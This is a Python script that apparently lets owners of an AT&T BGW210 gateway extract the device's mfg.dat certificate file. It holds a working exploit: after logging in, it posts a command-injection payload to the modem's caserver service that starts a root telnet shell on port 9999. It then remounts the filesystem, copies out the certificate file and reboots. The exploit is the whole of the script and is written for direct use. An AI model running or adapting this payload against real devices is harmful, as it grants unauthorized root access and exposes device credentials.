# BGW210 mfg.dat extractor
# Written by Daniel Jahren on 04/24/2020
# Research/manual instructions here: https://github.com/aus/pfatt/issues/57
# urllib requests telnetlib3 argparse wget beautifulsoup4 lxml
from urllib.parse import urlencode
import requests
import telnetlib
import time
import argparse
from bs4 import BeautifulSoup
import socket
import wget
import os
import sys

DEVICE_ADDR = "192.168.1.254"


##########################################
# This area contains all aux functions
##########################################
def is_open(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(0.5)
    try:
        s.connect((DEVICE_ADDR, int(port)))
        s.shutdown(2)
        return True
    except:
        return False


def fail():
    print("exploit failed. please try again")
    print("if this continues to fail, try rebooting")
    sys.exit(1)


def verify_input(res):
    if res != "n" and res != "y":
        print("incorrect input")
        start()


def usage():
    return "extract_mfg.py --access_code=<enter_access_code>\nthe device access code is printed on the side of " \
           "your modem \nit's needed to login and exploit the caserver binary "


def start():
    parser = argparse.ArgumentParser(usage=usage())
    parser.add_argument("--access_code", help="enter access code here", required=True)
    args = parser.parse_args()

    if not is_open(80):
        print("unable to connect to modem")
        fail()

    check_ver()

    print(
        "This procedure is potentially dangerous, and has the possibility of bricking the modem."
        "\nWhatever happens from here is your responsibility.")
    print("continue? y/n> ")
    res = input()

    verify_input(res)

    if res == "y":
        exploit(args.access_code)
    else:
        sys.exit(1)


##########################################
# This area contains all functions
# that communicate with the RG
##########################################

def send_command(tn, cmd):
    tn.write(cmd)
    time.sleep(1)
    tn.read_very_eager()


def check_ver():
    url = "http://" + DEVICE_ADDR + "/cgi-bin/sysinfo.ha"
    response = requests.get(url)
    parsed_html = BeautifulSoup(response.content, features="lxml")
    info_table = parsed_html.find("table", attrs={"class": "table75"})

    # collect table of info
    rows = list()
    for row in info_table.findAll("tr"):
        rows.append(row)
    # get version string from 3rd element of table
    ver_string = rows[3].text

    if ver_string.find("1.0.29") == -1:
        print("Incorrect software version")
        print("downgrade and come back")
        sys.exit(0)


# responsible for authenticating to the RG
def login(password):
    ipalloc_url = "http://" + DEVICE_ADDR + "/cgi-bin/ipalloc.ha"
    login_url = "http://" + DEVICE_ADDR + "/cgi-bin/login.ha"
    response = requests.get(ipalloc_url)

    headers = {
        'User-Agent': 'test-agent',
        'Connection': 'close',
        'Origin': 'http://192.168.1.254',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Referer': 'http://192.168.1.254/cgi-bin/ipalloc.ha',
    }

    parsed_html = BeautifulSoup(response.content, features="lxml")
    nonce = parsed_html.find('input', {'nonce': ''}).get('value')
    params = {'nonce': nonce, 'password': password, 'Continue': "Continue"}
    response = requests.post(login_url, data=urlencode(params), headers=headers)

    if response.text.find("password") != -1:
        print("Login failed")
        fail()


def exploit(access_code):
    mount_root_cmd = "mount -o remount,rw /dev/ubi0 /\n".encode('ascii')
    mount_mfg_cmd = "mount mtd:mfg -t jffs2 /mfg\n".encode('ascii')
    cp_mfg_cmd = "cp /mfg/mfg.dat /www/att/mfg.dat\n".encode('ascii')
    rm_mfg_cmd = "rm -rf /www/att/mfg.dat\n".encode('ascii')
    reboot_cmd = "reboot\n".encode('ascii')

    exploit_url = " https://" + DEVICE_ADDR + ":49955/caserver"
    exploit_param = "appid=001&set_data=| /usr/sbin/telnetd -l /bin/sh -p 9999|"

    print("logging in")
    login(access_code)
    print("\nlogin success")
    print("running command injection")
    headers = {
        'User-Agent': 'test-agent',
        'Connection': 'Keep-Alive'
    }

    injection = requests.post(exploit_url, headers=headers, data=exploit_param, auth=('tech', ''), verify=False)
    if injection.text.find("OK") == -1 or not is_open(9999):
        print("command injection failure")
        fail()

    print("command injection success")
    print("opening telnet shell")
    tn = telnetlib.Telnet(host=DEVICE_ADDR, port=9999)

    print("remounting rootfs")
    send_command(tn, mount_root_cmd)
    print("mounting mfg")
    send_command(tn, mount_mfg_cmd)
    print("copying mfg to webroot")
    send_command(tn, cp_mfg_cmd)
    print("downloading mfg")
    url = 'http://' + DEVICE_ADDR + '/mfg.dat'
    wget.download(url, 'mfg.dat')
    print("cleaning up")
    send_command(tn, rm_mfg_cmd)
    print("rebooting")
    send_command(tn, reboot_cmd)

    mfg_file = open("mfg.dat")

    if os.path.getsize("mfg.dat") == 262144:
        print("file size matches, success!")
    else:
        print("file size does not match")
        print("this could mean that the wrong file was extracted")
        sys.exit(1)

    sys.exit(0)


start()
